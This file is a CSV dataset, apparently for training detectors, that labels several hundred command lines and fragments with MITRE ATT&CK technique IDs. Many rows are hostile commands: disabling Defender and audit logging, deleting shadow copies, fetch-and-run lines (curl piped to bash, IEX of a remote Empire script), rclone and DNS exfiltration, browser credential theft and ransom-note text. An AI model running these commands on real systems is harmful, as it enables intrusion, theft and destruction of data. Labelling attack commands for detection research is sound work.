command,mitre_id
Select * From Win32_PingStatus where Address = 'mil.gov.ua',T1047
"[ ""$(uname)"" = 'FreeBSD' ] && encodecmd=""b64encode -r -"" && decodecmd=""b64decode -r"" || encodecmd=""base64 -w 0"" && decodecmd=""base64 -d""",T1059
kill_unwanted,T1562
"New-ItemProperty -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security"" -Name ""VBAWarnings"" -Value ""1"" -PropertyType ""Dword""",T1562
SeImpersonate,T1134
$EncodedCommand,T1027
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoTrayContextMenu /t REG_DWORD /d 1 /f",T1112
"echo ""b"" > /proc/sysrq-trigger",T1529
powershell Get-CimInstance -Namespace root/securityCenter2 -classname antivirusproduct,T1518
StartUserModeBrowserInjection,T1036
shutdown -h $timeout,T1529
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U $output_file,T1218
"if [ -x ""$(command -v ifconfig)"" ]; then ifconfig; else echo ""ifconfig is missing from the machine. skipping...""; fi;",T1016
"Write-Host ""Deploying AWS infrastructure... "" -NoNewLine",T1567
"cmd /c '$netscan_path' /hide /auto:""$env:temp\T1018NetscanOutput.txt"" /range:'$range_to_scan'",T1018
get-smbshare,T1135
Import-Module ActiveDirectory,T1098
Onedrive,T1036
echo $(echo $ENCODED) | base64 -d,T1140
docker run,T1543
[System.GC]::WaitForPendingFinalizers(),T1204
SeShutdownPrivilege,T1529
HKLM\Software\Microsoft\Windows\CurrentVersion\Run\,T1547
Set-EtwTraceProvider,T1562
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00"" /ve /T REG_SZ /d ""AtomicTest"" /f",T1546
NtImpersonateThread,T1134
"Remove-ADGroupMember -Identity ""Domain Admins"" -Members $remove_user -Credential $Credential -Confirm:$False",T1531
sudo make /tmp/hello,T1548
sc config Spooler start=auto,T1574
"zipfldr.dll, ieframe.dll",T1218
Start-Sleep -Second 5,T1134
%temp%\TrendMicroUpdate,T1074
"echo ""[Unit]"" > $path_to_systemd_service",T1053
mssch.xml,T1053
AttachUserPolicy,T1098
%HiddenKey%,T1564
"python3 -c ""import base64 as d;dec=d.b64decode(\""$ENCODED\"");print(dec.decode())""",T1140
GetProcAddress(),T1027
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell,T1060
if (-not (Test-Path $registryPath)) {,T1562
"ls -R | grep "":$"" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'",T1083
"$config | Out-File -FilePath ""PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf"" -Encoding ascii",T1567
wmic process call create $process_to_execute,T1047
Set-MpPreference -DisableRealtimeMonitoring 1,T1562
C:\Windows\System32\cmd.exe /q /c bcdedit /set {default} recoveryenabled no,T1490
scp.exe $local_path\$file_name $username@$remote_host:$remote_path,T1105
.ahk,T1059
"if ((${#HISTIGNORE[@]})); then echo ""\$HISTIGNORE = $HISTIGNORE""; else export HISTIGNORE='*'; echo ""\$HISTIGNORE = $HISTIGNORE""; fi",T1562
Win32_DiskDrive,T1082
/lib/udev/rules.d/,T1546
.sys,T1543
cscript //E:Jscript $script_file,T1204
tar -xf {PATH_SMB:.tar},T1105
reg export HKLM\SOFTWARE\Microsoft\Evilreg {PATH_ABSOLUTE}:evilreg.reg,T1564
Terminate{Extension/Filter},T1505
"$sheet.Cells.Item(7,1) = ""=FWRITELN(A5, `""`"")""",T1204
wmic path win32_VideoController get DriverVersion,T1082
"[ ""$(uname)"" = 'FreeBSD' ] && cmd=""lastlogin"" || cmd=""lastlog""",T1087
execv,T1574
fi,T1562
"Invoke-DNSExfiltrator -i ""$ps_module"" -d $domain -p $password -doh $doh -t $time $encoding",T1048
"runTime = ""20:04""",T1137
"rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},DefaultInstall_SingleUser,1,",T1218
and stopping the,T1562
PerformanceCache,T1564
Remote.exe /s {PATH_SMB:.exe} anythinghere,T1127
if ($_ -match 'End of Golden Ticket attack') { break },T1558
echo 'session = requests.session()' >> $python_script_name,T1059
.locked,T1486
AlphaZawgyl_font.exe,T1036
kill.bat,T1059
/Library/logs,T1070
cd $stratus_path,T1552
"""""|.\BrowserCollector.exe",T1555
"Write-Host ""Generated certificate """"$($cert.Thumbprint)""""""",T1098
[string]$directory,T1005
AnyDesk,T1219
echo $ART |/bin/sh,T1059
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\LoadAppInit_DLLs – 0x1,T1546
restart=always,T1543
/etc/audit/audit.rules,T1562
"rundll32.exe advpack.dll,LaunchINFSection ""$inf_to_execute"",DefaultInstall_SingleUser,1,",T1218
"""echo "" & payload & "" > ~/zshrc_aliases""",T1546
Windows Defender System Service,T1036
.vcrd,T1555
"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest"" /t REG_SZ /v ""DllName"" /d ""C:\Users\Public\AtomicTest.dll"" /f",T1547
if (-not (Test-Path $dest_path)) {,T1218
fnCOPYDATA,T1574
pm.sh,T1059
echo End of Silver Ticket attack,T1558
"Set-Content -Path ""$File_to_Encrypt_Location"" -Value ""populating this file with some text"" # Create the test.txt file again in case prereqs failed",T1486
C:\svchost.exe /c echo T1105 > \\localhost\c$\T1105.txt,T1105
tshark -c 5 -i $interface,T1040
Set-ADAccountPassword,T1531
net view /all,T1135
appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.msi} -setupcommandline /q -reportoutputpath {PATH_ABSOLUTE:.xml},T1218
msdtc.exe,T1036
"Set-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection"" -Name ""DisallowExploitProtectionOverride"" -Value 0",T1562
"Get-Item -Path ""HKLM:Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit""",T1012
svchost.exe,T1036
curl -sO $remote_url; chmod +x $payload_name | bash $payload_name,T1105
cmd /c start /b psr.exe /start /output $output_file /sc 1 /gui 0 /stopevent 12,T1113
del.bat,T1070
"Move-Item -Path $cert.PSPath -Destination ""Cert:\LocalMachine\Root""",T1553
"$tr.Add(""[Error] $root => $($_.Exception.Message)"")",T1083
if [ -f /etc/os-release ]; then cat /etc/os-release >> $output_file; fi,T1082
AppVLP.exe {PATH_SMB:.bat},T1218
OpenConsole.exe {PATH:.exe},T1202
"$sheet.Cells.Item(3,1) = ""atomic_redteam_x4m_exec.vbs""",T1204
compare,T1106
"if ($user -eq $null) { Write-Warning ""User not found""; exit }",T1098
"odbcconf INSTALLDRIVER ""lolbas-project|Driver={PATH_ABSOLUTE:.dll}|APILevel=2"" odbcconf configsysdsn ""lolbas-project"" ""DSN=lolbas-project""",T1218
} else {,T1003
"netsh advfirewall firewall add rule name=""RDPPORTLatest-TCP-In"" dir=in action=allow protocol=TCP localport=$NEW_Remote_Port",T1021
VirtualFree,T1106
/var/log/,T1070
CryptStringToBinaryA,T1140
"New-InboxRule -Mailbox $target_mailbox -Name $mail_rulename -SubjectOrBodyContainsWords (""phish"",""malware"",""hacked"") -Confirm:$false -DeleteMessage:$true",T1564
obfuskittiedump -consoleoutput -noninteractive,T1078
cmd.exe /c vssadmin delete shadows /for=c: /all /quiet”,T1490
"echo 'command=""/usr/bin/touch""' >> $rc_service_path/$rc_service_file",T1543
GetTcpTable,T1018
preinst,T1546
"cmd /c start /b netsh advfirewall firewall add rule name=""SGAccessInboundRule"" dir=in protocol=udp action=allow localport=49683",T1562
"Invoke-Expression ""$adrecon_path""",T1087
HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\Providers\Trust\FinalPolicy\{trust provider GUID},T1553
"New-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name DefaultUserName -Value Administrator -Force",T1562
Set-LocalUser,T1531
"net group ""Domain computers""",T1018
"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default"" /va /f",T1112
NTDLL,T1106
"reg query ""HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components""",T1012
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit,T1060
net user art-test $password,T1078
ECMangen.exe {REMOTEURL},T1105
echo '$command_to_add' >> ~/.bash_profile,T1546
C:\\Windows\\system32\\wbem\\wmic.exe shadowcopy delete,T1490
tempFiles,T1074
net.exe user $user_account $new_password,T1531
rundll32,T1047
ListView_SortItems,T1055
icacls C:\Windows\System32\AtBroker.exe /grant Administrators:F /t,T1546
action keys,T1546
File.txt,T1036
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID"" /ve /T REG_SZ /d ""AtomicTest"" /f",T1546
"rundll32.exe url.dll,FileProtocolHandler $command_to_execute",T1218
"wsl.exe --exec bash -c ""{CMD}""",T1202
"net group ""Domain Controllers"" /domain",T1018
BkavUtil.exe,T1057
"New-ItemProperty -Path Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\16.0\Excel\Security -Name ""VBAWarnings"" -Value ""1"" -PropertyType DWORD -Force | Out-Null",T1204
echo '. /etc/rc.subr' >> $rc_service_path/$rc_service_file,T1543
"if (test-path ""$exfil_folder"") {} else {new-item -path ""$env:temp"" -Name ""T1555.003"" -ItemType ""directory"" -force}",T1555
Find-AVSignature,T1027
get-wmiObject -class Win32_Process,T1057
Write-Host $_.Exception.Message,T1110
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe $output_file,T1218
"echo ""ExecStart=$execstart_action"" >> $systemd_service_path/$systemd_service_file",T1543
logins.json,T1552
regsvr32.exe /u /s {PATH:.dll},T1218
HeapCreate,T1106
%temp%\tcm.tmp -decode %temp%\T1140_calc2.txt %temp%\T1140_calc2_decoded.exe,T1140
C:\AMD\Temp,T1074
ver >> %temp%\download,T1082
ExcelRepairToolboxLauncher.exe,T1553
"/usr/libexec/PlistBuddy -c ""print :CFBundleShortVersionString"" /Applications/Safari.app/Contents/Info.plist",T1518
TTTracer.exe -dumpFull -attach {PID},T1003
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /v ""NoAutoUpdate"" /t REG_DWORD /d 1 /f",T1112
Get-ADGroupMember Administrators -Recursive,T1482
tp.PrivilegeCount = 1;,T1562
msbuild.exe {PATH:.xml},T1127
GetDriveTypeW,T1680
"dscl . -create /Users/AtomicUser RealName ""Atomic User""",T1078
tasklist.exe | findstr /i cylance,T1518
cmd /c c:\temp\PsExec.exe -accepteula -j -d -s [Target Binary],T1569
"Invoke-WebRequest $domain -UserAgent ""Opera/8.81 (Windows NT 6.0; U; en)"" | out-null",T1071
"auditpol /set /category:""Detailed Tracking"" /success:disable",T1562
rc.local,T1037
"echo ""If you' re indeed interested in our assistance and the services we provide you can reach out to us following simple instructions:"" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
"rundll32 ""{PATH}:ADSDLL.dll"",DllMain",T1564
"(([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]""$_"").gPlink){Write-Host ""[+] Domain Path:""([ADSI]""$_"").Path;$a=((([ADSI]""$_"").gplink) -replace ""[[;]"" -split ""]"");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host ""Policy Path[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host ""Policy Name[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output ""`n"" }}",T1087
Copy-Item -Path $docPath -Destination $copyPath -Force,T1137
printenv LANG,T1614
compareForfor.jpg,T1036
chmod +x $rc_service_path/$rc_service_file,T1543
".\rclone.exe copy --max-size 1700k ""$dir_to_copy"" $remote_share:test -v",T1567
ssh-keygen -t rsa -f $HOME/.ssh/id_rsa -P,T1098
ShellExecuteW,T1106
"Write-Host ""Error code: $errCode""",T1098
clang++ $input_file && ./a.out,T1027
"python ""$filename"" -i $host_ip",T1046
"if [ $(history |wc -l) -eq 1 ]; then echo ""ls -la is not in history cache""; fi",T1562
if [ -f /etc/sudoers ]; then sudo cat /etc/sudoers > $output_file; fi;,T1087
$env:UserName | Out-File -FilePath .\CurrentactiveUser.txt -Append,T1033
.vmx,T1564
"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\jsestartup.jse"" ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse""",T1547
rekeywiz.exe,T1036
wbemtest.exe,T1047
taskmanager,T1057
Remote.exe /s {PATH:.exe} anythinghere,T1127
"Get-Service -Name ""Remote Desktop Services"", ""Remote Desktop Configuration""",T1046
KeepPrintedJobs,T1112
"echo ""foo"" | runas /netonly /user:fake ""$env:TEMP\golden.bat"" | Out-Null",T1558
Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name,T1069
copy /b,T1140
msinfo32.exe,T1036
chrome.exe,T1218
"Write-Host ""Successfully retrieved TGT from '$target', now requesting a TGS from local""",T1550
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest"" /ve /T REG_SZ /d ""AtomicTest"" /f",T1546
InterlockedExchange,T1106
CWWiFiClient,T1217
[exfils3],T1567
$ADSearch.PropertiesToLoad.Clear(),T1552
"Copy-Item $profile\logins.json -Destination ""PathToAtomicsFolder\..\ExternalPayloads"" > $null",T1555
do shell script,T1059
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1 /f,T1112
"Write-Output ""Function code upload failed.""",T1528
g++ $input_file && ./a.out,T1027
GetProcAddress,T1106
code.exe tunnel,T1219
RegDeleteValueA,T1112
ImprovedReflectiveDLLInjection,T1055
"New-NetEventSession -Name Capture007 -LocalFilePath ""$ENV:Temp\sniff.etl""",T1040
bioset,T1546
CommandLine = $CommandLine,T1218
"reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test"" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f",T1546
docker exec t1069_container ./test.sh,T1069
function MatchesExtension($path) {,T1083
"if (-not (Test-Path ""$file_to_manipulate"")) { New-Item ""$file_to_manipulate"" -Force }",T1070
"echo ""[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\NPPSpy.txt""",T1003
"""$recon_commands""",T1016
"New-Item -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security""",T1562
_layouts/15/,T1505
"osascript -e 'tell application ""Finder""' -e 'set destinationFolderPath to POSIX file ""$destination_path""' -e 'set safariFolder to ((path to library folder from user domain as text) & ""Containers:com.apple.Safari:Data:Library:Cookies:"")' -e 'duplicate file ""Cookies.binarycookies"" of folder safariFolder to folder destinationFolderPath with replacing' -e 'end tell'",T1539
"REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\$target_binary"" /v MonitorProcess /d ""$payload_binary""",T1546
/root/.ssh,T1098
"if [ -z ""${TMP}"" ] ; then echo ""renamed process NOT FOUND in process list"" && exit 1; fi",T1036
ITaskService,T1559
WMIC.exe WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get * /Format:List,T1518
Start-ATHProcessUnderSpecificParent -FilePath $file_path -CommandLine '$command_line' -ParentId $parent_pid,T1134
sudo systemctl disable falcon-sensor.service,T1562
Connect-MgGraph,T1021
qwinsta.exe,T1033
cd $test_folder; touch a b c d e f g,T1560
"sc create W64Time binPath= ""c:\Windows\System32\svchost.exe -k TimeService"" type= share start=auto",T1543
usermod --lock art,T1078
"Copy-Item ""$env:PathToAtomicsFolder\T1555.003\src\key4.db"" -Destination $profile\ > $null",T1555
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System Enable LUA=”0”,T1112
/c cd /d c:\windows\temp\ & del \\<IP ADDRESS>\c$\windows\temp\LMAKSW.ps1,T1070
sudo cp $path_startup_params /Library/StartupItems/StartupParameters.plist,T1037
regasm.exe {PATH:.dll},T1218
"New-Item -ItemType Key -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run""",T1547
cmd /c $venv_path\Scripts\python.exe $Firepwd_Path -d $PasswordDBLocation > $Out_Filepath,T1555
"wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:{PATH_ABSOLUTE:folder} -itemtype:file -items:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -notRestoreAcl -quiet",T1003
Set-PSReadLineOption -AddToHistoryHandler { return $false },T1070
New-Item -ItemType Directory -Path $output_dir -Force | Out-Null,T1113
cache.bat,T1059
dsenableroot -u art-tester -p art-tester -r art-root #new user,T1078
~/Library/.DS_Stores/,T1564
"""function $cmdlets { Write-Host Pretending to invoke $cmdlets }""}",T1059
wsl.exe -e /mnt/c/Windows/System32/calc.exe,T1202
PS_ScheduledTask,T1053
pw useradd $username -s /usr/sbin/nologin -d /nonexistent -c evil_account,T1136
vim-cmd hostsvc/enable_ssh,T1021
GetUserNameA,T1106
"New-Item -ItemType Directory -path ""$new_startup_folder""",T1547
public static bool EnableSeDebugPrivilege() {,T1562
Get-Webconfig,T1552
dir /s /b %USERPROFILE%\Favorites,T1217
"C:\Windows\SysWow64\Register-CimProvider.exe -Path ""$dll_payload""",T1218
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe,T1546
rar.exe,T1560
/data2/.bd.key/preload.so,T1574
shmget API,T1559
aws iam add-user-to-group --user-name $username --group-name $username,T1098
$ShortCut.WindowStyle = 1;,T1547
"dir ""%systemdrive%\Users\*.*"" >> $output_file",T1083
NSFileManger contentsOfDirectoryAtPath(),T1518
<PID>/maps,T1003
chown -R $owner $file_or_folder,T1222
HKEY_LOCAL_MACHINE\Software\Microsoft\Office test\Special\Perf,T1137
useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art,T1078
sockstat -4,T1049
rotate,T1140
HKEY_CURRENT_USER\Software\Microsoft\Office\<Excel Version>\Excel\Security\AccessVBOM\,T1112
GetSystemDefaultUILanguage,T1614
"for /l %i in ($start_host,1,$stop_host) do ping -n 1 -w 100 $subnet.%i",T1018
kubectl get cronjobs -n $namespace,T1053
trap 'command list' signals,T1546
winhelp,T1036
/etc/rc.local.d/local.sh,T1564
$ADSearch.Filter = '(name=CryptoPolicy)',T1552
wevutil,T1070
$requiredGraphAccess.ResourceAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.ResourceAccess],T1098
finger user@example.host.com | more +2 | cmd,T1105
/private/var/db/emondClients,T1546
"stop-process -name ""chrome"" -force -erroraction silentlycontinue",T1539
url,T1105
echo Tickets after requesting schtasks:,T1558
HKEY_CURRENT_USER\Software\Microsoft\Office\,T1112
psr.exe /start /output {PATH_ABSOLUTE:.zip} /sc 1 /gui 0,T1113
esentutl.exe /y {PATH_ABSOLUTE:.exe} /d {PATH_ABSOLUTE}:file.exe /o,T1564
CreateProcessAsUser,T1546
IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose,T1134
netsh advfirewall firewall show rule name=all,T1016
known_hosts,T1018
Consumer = [Ref] $Consumer;,T1546
kldstat,T1082
"Copy-Item ""$PathToAtomicsFolder\T1546.011\bin\T1546.011CompatDatabase.sdb"" C:\Windows\apppatch\Custom\T1546.011CompatDatabase.sdb",T1546
"rundll32 vbscript:""\..\mshtml,RunHTMLApplication ""+String(CreateObject(""WScript.Shell"").Run(""$command_to_execute""),0)",T1218
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Pniumj,T1112
Get-ADUser,T1087
Label,T1543
"cmd /c ""`""C:\Program Files (x86)\GnuPG\bin\gpg.exe`"" --passphrase 'SomeParaphraseBlah' --batch --yes -c `""$File_to_Encrypt_Location`""""",T1486
New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force,T1546
zip -r,T1560
"sudo cp ""$plist"" /etc/emond.d/rules/T1546.014_emond.plist",T1546
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated,T1012
"timeout --preserve-status $timeout whois -h $remote_host -p $remote_port ""$query"" > $output_file",T1105
"rundll32.exe {PATH},EntryPoint",T1218
"Import-Module ""PathToAtomicsFolder\..\ExternalPayloads\AzureStealth.ps1"" -force",T1082
"VSDiagnostics.exe start 2 /launch:{PATH:.exe} /launchArgs:""{CMD:args}""",T1127
"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableScanOnRealtimeEnable"" -Value 1",T1562
iptables,T1574
icacls.exe $file_or_folder /grant $user_or_group:F,T1222
"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fAllowToGetHelp /t REG_DWORD /d 1 /f",T1112
MMDeviceEnumerator,T1546
reg add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f,T1562
cmd.exe net user /domain,T1087
"mshta ""$temp_file""",T1218
"netsh advfirewall firewall set rule group=""remote desktop"" new enable=Yes",T1562
LoadLibraryA(),T1106
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx,T1060
"sdbinst.exe ""$file_path""",T1546
ctrl+c,T1546
Set-VMFirmware $VM -EnableSecureBoot Off,T1564
ScDeviceEnums,T1036
